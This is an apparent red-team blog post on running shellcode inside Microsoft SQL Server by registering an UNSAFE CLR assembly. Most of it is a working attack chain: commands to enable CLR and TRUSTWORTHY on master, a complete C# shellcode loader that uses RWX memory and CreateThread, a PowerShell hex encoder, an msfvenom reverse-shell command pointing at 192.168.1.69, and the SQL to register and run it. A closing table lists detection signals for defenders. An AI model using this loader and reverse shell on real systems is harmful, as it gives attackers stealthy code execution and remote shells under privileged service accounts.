---
title: "Code Execution via MSSQL CLR Assemblies"
description: "Executing native shellcode inside the SQL Server process by loading an unsafe CLR assembly."
tags: [mssql, clr, shellcode, windows, red-team]
category: "Blog"
date: 2025-01-13
---

# Code Execution via MSSQL CLR Assemblies

Microsoft SQL Server supports the execution of managed .NET code inside the `sqlservr.exe` process through its Common Language Runtime (CLR) integration feature. When an assembly is registered with the `UNSAFE` permission set, it can invoke arbitrary Win32 APIs through P/Invoke, which enables in-process execution of native shellcode without spawning a child process. The full technique below: enabling CLR, compiling a loader assembly, converting it to the hex representation required by `CREATE ASSEMBLY`, and invoking the resulting stored procedure to run a payload.

The technique is a well-established post-exploitation primitive for adversaries who have obtained the `sysadmin` server role. It is described, among other places, in Offensive Security's PEN-300 course material.

## Environment

| Component | Version |
|-----------|---------|
| SQL Server | 2022 Developer Edition |
| SSMS | 20.2.30.0 |
| Operating System | Windows 10 Pro x64 (build 19045) |
| .NET Framework | 4.0.30319.42000 |

## Background

SQL Server exposes a managed execution host via CLR integration, allowing user-defined functions, stored procedures, and triggers to be written in a .NET language and executed within the server process. Registered assemblies are assigned one of three permission sets: `SAFE`, `EXTERNAL_ACCESS`, or `UNSAFE`. The `UNSAFE` permission set removes the managed sandbox constraints and allows the assembly to call unmanaged code and access protected operating system resources.

Because the resulting code executes inside `sqlservr.exe`, this technique has two properties relevant to offensive operations:

1. The payload inherits the SQL Server service account, which in many environments is a domain service account with elevated privileges.
2. No child process is created. Telemetry that relies on process creation events (for example, `xp_cmdshell`) does not apply.

The prerequisites are `sysadmin` on the target instance and the ability to enable `TRUSTWORTHY` on at least one database owned by a `sysadmin`-mapped login.

## Technique

### Step 1: Enable CLR Integration

```sql
EXEC sp_configure 'clr enabled', 1;
RECONFIGURE;
GO
ALTER DATABASE master SET TRUSTWORTHY ON;
GO
```

`TRUSTWORTHY ON` on the `master` database is a non-default, high-risk configuration change. Defenders should monitor for it.

### Step 2: Implement the Loader Assembly

The loader is a single SQL CLR stored procedure that accepts a hex-encoded shellcode string, allocates a region of memory with `VirtualAlloc` using `PAGE_EXECUTE_READWRITE` (`0x40`) and `MEM_COMMIT` (`0x1000`), copies the shellcode into the allocated region, and invokes `CreateThread` to execute it.

```csharp
using System;
using Microsoft.SqlServer.Server;
using System.Runtime.InteropServices;

public partial class StoredProcedures
{
    [SqlProcedure]
    public static void ShellcodeLoader(string sc)
    {
        SqlContext.Pipe.Send(ShellcodeExec(sc));
    }

    public static string ShellcodeExec(string sc)
    {
        byte[] shellcode = ConvertHexToByteArray(sc);
        UInt64 addr = VirtualAlloc(0, (UInt64)shellcode.Length, 0x1000, 0x40);
        Marshal.Copy(shellcode, 0, (IntPtr)addr, shellcode.Length);
        CreateThread(0, 0, addr, 0, 0, 0);
        return "";
    }

    private static byte[] ConvertHexToByteArray(string hex)
    {
        byte[] bytes = new byte[hex.Length / 2];
        for (int i = 0; i < bytes.Length; i++)
            bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
        return bytes;
    }

    [DllImport("kernel32")]
    private static extern UInt64 VirtualAlloc(UInt64 lpAddress, UInt64 dwSize,
        UInt64 flAllocationType, UInt64 flProtect);

    [DllImport("kernel32")]
    private static extern UInt32 CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize,
        UInt64 lpStartAddress, UInt32 lpParameter, UInt32 dwCreationFlags, UInt32 lpThreadId);
}
```

The project is created as a SQL Server Database Project in Visual Studio. The project-level `SQLCLR` property is set to `Unsafe`, and the output DLL is compiled in `Release` configuration.

### Step 3: Encode the Assembly as Hex

`CREATE ASSEMBLY` accepts the binary inline as a hex literal. The compiled DLL is converted to a contiguous hex string:

```powershell
$assemblyFile = "C:\Users\DevHost\source\repos\SQLSampleSC\SQLSampleSC\bin\Release\SQLSampleSC.dll"

$stringBuilder = New-Object System.Text.StringBuilder
$fileStream = [IO.File]::OpenRead($assemblyFile)

while (($b = $fileStream.ReadByte()) -gt -1) {
  $null = $stringBuilder.Append($b.ToString("X2"))
}

("0x{0}" -f $stringBuilder.ToString()) |
  Out-File -FilePath "C:\Users\DevHost\Desktop\sql.txt"
```

The output begins with `4D5A9000...`, the hex representation of the PE `MZ` header.

### Step 4: Generate the Shellcode

Any 64-bit Windows shellcode is compatible. For demonstration, a reverse TCP shell is generated with msfvenom:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.69 LPORT=443 -f hex
```

### Step 5: Register and Execute

```sql
CREATE ASSEMBLY MSSQL_ShellCodeLoader
FROM 0x...<HEX of compiled DLL>
WITH PERMISSION_SET = UNSAFE;
GO

CREATE PROCEDURE shellcode_loader
  @sc NVARCHAR(MAX)
AS EXTERNAL NAME MSSQL_ShellCodeLoader.StoredProcedures.ShellcodeLoader;
GO

DECLARE @shellcode NVARCHAR(MAX) = '<HEX of shellcode>';
EXEC shellcode_loader @shellcode;
```

The payload executes inside `sqlservr.exe` under the SQL Server service account.

## Detection Considerations

| Signal | Description |
|--------|-------------|
| `ALTER DATABASE ... SET TRUSTWORTHY ON` | Non-default configuration change, logged in the default trace. |
| `CREATE ASSEMBLY ... WITH PERMISSION_SET = UNSAFE` | Registration of an unsafe assembly is inherently high risk. |
| `sp_configure 'clr enabled', 1` | Enabling CLR integration on servers where it has not been in use. |
| Outbound network connections from `sqlservr.exe` | SQL Server rarely initiates outbound connections; this is a strong indicator of in-process payload execution. |
| Memory regions in `sqlservr.exe` with `PAGE_EXECUTE_READWRITE` backed by no image | Consistent with manually allocated shellcode. |

Monitoring the SQL Server default trace and Extended Events for CLR assembly registration and `TRUSTWORTHY` changes, in combination with process-level telemetry on `sqlservr.exe`, covers the majority of the primitives used above.

## References

- Microsoft: [CLR Integration](https://learn.microsoft.com/en-us/sql/relational-databases/clr-integration/common-language-runtime-clr-integration-programming-concepts)
- Microsoft: [TRUSTWORTHY database property](https://learn.microsoft.com/en-us/sql/relational-databases/security/trustworthy-database-property)
- Offensive Security: [PEN-300](https://www.offsec.com/courses/pen-300/)
